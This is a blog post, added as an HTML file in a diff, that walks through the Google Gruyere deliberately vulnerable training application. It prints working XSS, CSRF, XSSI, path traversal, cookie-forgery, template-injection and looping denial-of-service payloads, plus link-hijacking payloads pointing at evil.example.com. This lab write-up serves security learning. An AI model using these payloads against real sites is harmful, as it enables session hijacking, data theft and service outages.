@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+      <title>m4l1c3.github.io</title>
+
+      
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://m4l1c3.github.io/atom.xml">
+      
+
+      
+          <link rel="stylesheet" href="https://m4l1c3.github.io/site.css">
+      
+
+      
+      
+    </head>
+
+    <body class="hack dark main container">
+        
+    
+        
+                
+                    <header>
+                        <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io">
+                                <span itemprop="name">Home
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;categories">
+                                <span itemprop="name">Categories
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;tags">
+                                <span itemprop="name">Tags
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;atom.xml">
+                                <span itemprop="name">Feed
+                                </span></a>
+                        
+                        </nav>
+                    </header>
+                
+            
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">Google Gruyere</h1>
+        <span class="muted">
+    <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>10 minute read</span>
+    <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2017-03-28
+</span>
+    </header>
+    <div itemprop="articleBody">
+      <p>#XSS</p>
+<p>##File upload
+For this I simply uploaded the following in an HTML file:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><html><head><title></title></head><body>&lt;script&gt;alert('hi')&lt;/script&gt;</body>
+</code></pre>
+<p>Then browsed to the URL provided</p>
+<p>##Reflected XSS
+This was as simple as appending the following to the site URL:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html">&lt;script&gt;alert('hi')&lt;/script&gt;
+</code></pre>
+<p>##Stored XSS
+Here there are two places that come to mind immediately, snippets and the profile page.  There are quite a few ways to skin this cat, the one I was able to get working in multiple browsers was by using the onmouseover attribute of valid HTML elements to pop an alert, this was done using a snippet:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html">&lt;a href="#" onmouseover="alert(1)"&gt;test&lt;/a&gt;
+</code></pre>
+<p>##Stored XSS Via HTML Attributes
+The only place I can think of to perform this other than a snippet which we already got exploited is in the profile page, it wasn't obvious to be intially, but the profile color input can be used to apply inline CSS to your name on the home page.  For this I ended up with the following:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html">black' onmouseover='alert(1)' onfocus='alert(2)' onblur='alert(3)
+</code></pre>
+<p>This makes my user's name throw an alert on hover, then on the edit profile page is pops on focus and blur, one thing to note, this didn't initially fire because I was trying to follow normal HTML standards, after viewing page source rather than using browser debug tools I saw single quotes were used rather than normal double quotes.</p>
+<p>##Stored XSS Via Ajax
+This one took a lot of messing around, based on Google's provided hints, the refresh button was our target.  After tinkering a lot I was able to come up with this:</p>
+<pre data-lang="javascript" class="language-javascript "><code class="language-javascript" data-lang="javascript">hey &lt;span style=display:none&gt;eval(" + (alert(1),"") + ")&lt;/span&gt;hi
+</code></pre>
+<p>This works because when you hit refresh on home a JSON object containing the latest snippets from each user gets eval'd in JavaScript, it took me quite a while to get this because I kept thinking I would need valid JSON, however when using eval the JSON value just has to be parseable JavaScript.</p>
+<p>##Reflected XSS Via Ajax
+This is very similar to the previous reflected XSS attack mentioned previously, it just gets hit in a different way.  After reading and looking through the code samples Google provides I noticed that the feed page when supplied the uid query string parameter does an eval-ish processing on the page that takes a URL like this:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html">feed.gtl?uid=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>Then renders like this in page source:</p>
+<pre data-lang="javascript" class="language-javascript "><code class="language-javascript" data-lang="javascript">_feed((
+[
+"&lt;script&gt;alert(1)&lt;/script&gt;"
+]
+))
+</code></pre>
+<p>{
+&quot;private_snippet&quot;:
+&quot;private&quot;</p>
+<p>,&quot;cheddar&quot;:
+&quot;Gruyere is the cheesiest application on the web.&quot;</p>
+<p>,&quot;bob&quot;:
+&quot;all <span style=display:none>&quot; + (alert(1),&quot;&quot;) + &quot;</span>your base&quot;
+,&quot;brie&quot;:
+&quot;Brie is the queen of the cheeses<span style=color:red>!!!</span>&quot;
+}</p>
+<p>#Client-State manipulation</p>
+<p>##Priviledge elevation
+In watching requests go through Burp I noticed that user registration passes the query string parameter is_author=True, which made me wonder if there was an is_admin option to pass.  After that I was seeing my requests to update a user profile, this also included the is_author parameter.  So I just started trying to set is admin.  Initially it seemed like no attempts were working, after looking through Google's hints it turns out that you need to log out then log back in, this way the cookie that gets used to identify you includes the admin flag, which doesn't happen by just editing the cookie.</p>
+<p>The reason for this is that the cookie is structured as follows:</p>
+<p>32400598|bob||author</p>
+<p>The first integer value is a token that gets generated server side, this seems to be the reason I wasn't able to just modify the cookie directly to get elevated privilidges.  Upon logging out and back in the cookie looks more like this:</p>
+<p>32400598|bob|admin|author</p>
+<p>Now the profile page has all the admin options and the manage server link also shows up.</p>
+<p>##Cookie manipulation
+This actually ended up being a bit more difficult, the cookie that gets set to identify a given browser as being a given system user gets generated based on the login or signing up of a user.  After trying a lot of different options I broke down and looked at the hints from Google and ended up with:</p>
+<p>brie|admin|author</p>
+<p>As my username when registering, a side affect (or what appears to be one) is that this can circumvent logging in as well.  Upon clicking sign in I was authenticated as brie without actually logging in.</p>
+<p>##CSRF
+All of these items require browsing an HTML file locally while also authenticated with Gruyere</p>
+<p>To complete the exercise of deleting someone's snippet:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><html><head><title></title></head><body><img src="http://google-gruyere.appspot.com/458351305912/deletesnippet?index=0" /></body></html>
+</code></pre>
+<p>Then just for fun, I tested updating a user's profile using the same technique, which worked:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><html><head><title></title></head><body><img src="http://google-gruyere.appspot.com/458351305912/saveprofile?action=update&uid=bob&name=bob&oldpw=&pw=&icon=buttfart&web_site=http%3A%2F%2Fgithub.com&color=black&private_snippet=privat" />
+</body></html>
+</code></pre>
+<p>##XSSI
+For this exercise I ended up with:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><html><head><title></title></head><body>
+<script>function _feed(s) {document.write('your private thing is: ' + s['private_snippet']);}</script><script src="http://google-gruyere.appspot.com/458351305912/feed.gtl"></script></body></html>
+</code></pre>
+<p>What this is doing is defining a function that matches how the JavaScript in feed.gtl gets called, and then outputting data stored outside of our local files boundaries, but because the executing script has Google's system/domain as its context it has access to the snipped data where our _feed(s) function would have never originally had access.</p>
+<p>#Path Traversal</p>
+<p>##Information disclosure via path traversal
+This ended up being really simple, but the browser was correcting the URL so it didn't work initially, my ../secret.txt needed to be ..%2Fsecret.txt, updating the encoding made things work.</p>
+<p>##Data tampering via path traversal
+For this one I started off trying to get the file overwritten by having a filename that included the directory traversal, however that just wouldn't work:
+..%2F..2Fsecret.txt</p>
+<p>After a bit of head scratching the username ended up working, signing up as a user with the name: ..%2F..%2F then uploading a new secret.txt, success.</p>
+<p>#Denial of Service</p>
+<p>##DoS - Quit the server
+This one was pretty fun.  I totally forgot about CORS and originally wrote up a snippet of JavaScript to try and get this working, however the ajax requests got blocked by browser security.</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><html>
+  <head>
+      <title></title>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+      <script>
+          (function($) {
+              'use strict';
+              var killbot = {
+                  init: function() {
+                      setInterval(function() {
+                          $.ajax({
+                              method: 'GET',
+                              url: 'http://google-gruyere.appspot.com/458351305912/quitserver'
+                          }).done(function(response) {
+                              document.write('Killed server successfully\n');
+                              document.write(response);
+                          }).error(function(response) {
+                              document.write('Error killing server');
+                              document.write(response);
+                          });
+                      }, 5000);
+                  },
+                  handleEvents: function() {
+                      let self = this;
+                      $('#start').on('click', function(e) {
+                          e.preventDefault();
+                          self.init();
+                      });
+
+                      $('#stop').on('click', function() {
+                          e.preventDefault();
+                          clearInterval();
+                      });
+                  }
+              };
+              killbot.init();
+          }(jQuery));
+      </script>
+  </head>
+  <body>
+      <ul>
+          <li><a href="#" id="start">start</a></li>
+          <li><a href="#" id="stop">stop</a></li>
+      </ul>
+      <img src=""
+  </body>
+</html>
+</code></pre>
+<p>At this point I was thinking how useful would making a CSRF-ish attack using an image tag be?  It turns out with some Javascript and the image tag method worked together beautifully.</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><html>
+  <head>
+      <title></title>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+      <script>
+          (function($) {
+              'use strict';
+              var killbot = {
+                  init: function() {
+                      setInterval(function() {
+                          $('img').attr('src', 'http://google-gruyere.appspot.com/458351305912/quitserver');
+                      }, 200);
+                  },
+                  handleEvents: function() {
+                      let self = this;
+                      $('#start').on('click', function(e) {
+                          e.preventDefault();
+                          self.init();
+                      });
+
+                      $('#stop').on('click', function() {
+                          e.preventDefault();
+                          clearInterval();
+                      });
+                  }
+              };
+              killbot.init();
+          }(jQuery));
+      </script>
+  </head>
+  <body>
+      <ul>
+          <li><a href="#" id="start">start</a></li>
+          <li><a href="#" id="stop">stop</a></li>
+      </ul>
+      <img src="http://google-gruyere.appspot.com/458351305912/quitserver" />
+  </body>
+</html>
+</code></pre>
+<p>This worked both in an authenticated and un-authenticated browser session, its basically utilizing the same method to continually performing the server quit action on a loop.  Then just for fun I tried this on a browser that wasn't authenticated and it still worked, double whammy.</p>
+<p>##DoS - Overloading the server
+I had to look at the hints on this one to get it working.  Pretty much just overridding a template that gets rendered on every page, it ended up being menubar.gtl:</p>
+<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">[[include:menubar.gtl]]DoS[[/include:menubar.gtl]]
+</code></pre>
+<p>#Code Execution
+From looking at the files that power gruyer and the docs it looks like one of these .py files could be used.  I tried a few, the last of which being sanitize.py adding the following:</p>
+<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from urlparse import urlparse, parse_qs
+
+form = util.FieldStorage(req, keep_blank_values=1)
+myparameter = form.getfirst("cmd")
+print myparameter
+</code></pre>
+<p>#Configuration Vulnerabilities</p>
+<p>##Information Disclosure 1
+This one ended up being pretty easy, the description mentioned checking the files, a quick search through with grep for debug and config:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">grep -irE 'debug|config' *
+gruyere.py:  def _DoReset(self, cookie, specials, params):  # debug only; resets this db
+gtl.py:  elif escaper_name == 'pprint':  # for debugging
+resources/dump.gtl:<title>Debug Dump</title>
+</code></pre>
+<p>Looking at dump.gtl is prints the database out to a page:</p>
+<pre data-lang="json" class="language-json "><code class="language-json" data-lang="json">_cookie:  	
+
+{'is_admin': True, 'is_author': True, 'uid': u'bob'}
+
+_profile:  	
+
+{'is_author': 'True', 'name': 'bob', 'pw': 'password'}
+
+_db:  	
+
+{'../': {'is_author': 'True', 'name': '../', 'pw': 'password'},
+ '../../': {'is_author': 'True', 'name': '../../', 'pw': 'password'},
+ 'administrator': {'is_admin': True,
+                   'is_author': False,
+                   'name': 'Admin',
+                   'private_snippet': 'My password is secret. Get it?',
+                   'pw': 'secret',
+                   'web_site': 'http://www.google.com/contact/security.html'},
+ 'bob': {'is_author': 'True', 'name': 'bob', 'pw': 'password'},
+ 'bob|admin|author': {'is_author': 'True',
+                      'name': 'bob|admin|author',
+                      'pw': 'password'},
+ 'brie': {'color': 'red; text-decoration:underline',
+          'is_admin': False,
+          'is_author': True,
+          'name': 'Brie',
+          'private_snippet': 'I use the same password for all my accounts.',
+          'pw': 'briebrie',
+          'snippets': ['Brie is the queen of the cheeses<span style=color:red>!!!</span>'],
+          'web_site': 'http://news.google.com/news/search?q=brie'},
+ 'cheddar': {'color': 'blue',
+             'is_admin': False,
+             'is_author': True,
+             'name': 'Cheddar Mac',
+             'private_snippet': 'My SSN is <a href="http://www.google.com/search?q=078-05-1120">078-05-1120</a>.',
+             'pw': 'orange',
+             'snippets': ['Gruyere is the cheesiest application on the web.',
+                          'I wonder if there are any security holes in this....'],
+             'web_site': 'http://images.google.com/images?q=cheddar+cheese'},
+ 'sardo': {'color': 'red',
+           'is_admin': False,
+           'is_author': True,
+           'name': 'Miss Sardo',
+           'private_snippet': 'I hate my brother Romano.',
+           'pw': 'odras',
+           'snippets': [],
+           'web_site': 'http://www.google.com/search?q="pecorino+sardo"'}}
+</code></pre>
+<p>##Information Disclosure 2
+After digging around more in the code thinking the vulnerability existed somewhere else I remembered that I can just upload arbitrary files to the server.  So I just went and uploaded the dump.gtl file back to the server in resources, then I was able to use the dump template again.</p>
+<p>##Information Disclosure 3
+This one referred to bad code so I starting going through the python some more.  Looking at gtl.py, which looks like it handles the various components of the templating language.  There is a section that uses {{ }} as variables:</p>
+<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">VAR_OPEN = '{{'
+VAR_CLOSE = '}}'
+
+
+def _ExpandVariables(template, specials, params, name):
+  """Expands all the variables in a template."""
+  result = []
+  rest = template
+  while rest:
+    tag, before_tag, after_tag = _FindTag(rest, VAR_OPEN, VAR_CLOSE)
+    if tag is None:
+      break
+    result.append(rest[:before_tag])
+    result.append(str(_ExpandVariable(tag, specials, params, name)))
+    rest = rest[after_tag:]
+  return ''.join(result) + rest
+</code></pre>
+<p>This looks like it would be used for handling something like {{_db:pprint}} from dump.gtl</p>
+<p>Looking at the edit/show profile template, two of the fields in a profile use the {{}} syntax for outputting data:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><input type='text' name='web_site' value='{{_profile.web_site:text}}'>
+<input type='text' name='private_snippet' value='{{_profile.private_snippet:text}}'>
+</code></pre>
+<p>They look like something to check out, lets just try putting {{_db:pprint}} in.</p>
+<p>After saving the db dump gets thrown into the form controls.</p>
+<p>#Ajax Vulnerabilities</p>
+<p>##DoS via Ajax</p>
+<pre data-lang="javascript" class="language-javascript "><code class="language-javascript" data-lang="javascript">" + eval(document.getElementById('menu-right').getElementsByTagName('a')[0].setAttribute('href', 'http://evil.example.com')) + "
+</code></pre>
+<p>##Phishing via Ajax
+&quot; + eval(console.log(document.getElementById('menu-right').getElementsByTagName('a')[0].setAttribute('href', 'http://evil.example.com'))) + &quot;</p>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by m4l1c3
+                
+                
+                    
+                    in <a href="https://m4l1c3.github.io/categories/vulnerable-web-app/">vulnerable-web-app</a>
+                
+                
+                    and tagged
+                    
+                        <a href="https://m4l1c3.github.io/tags/google/">google</a>
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+    </body>
+
+</html>
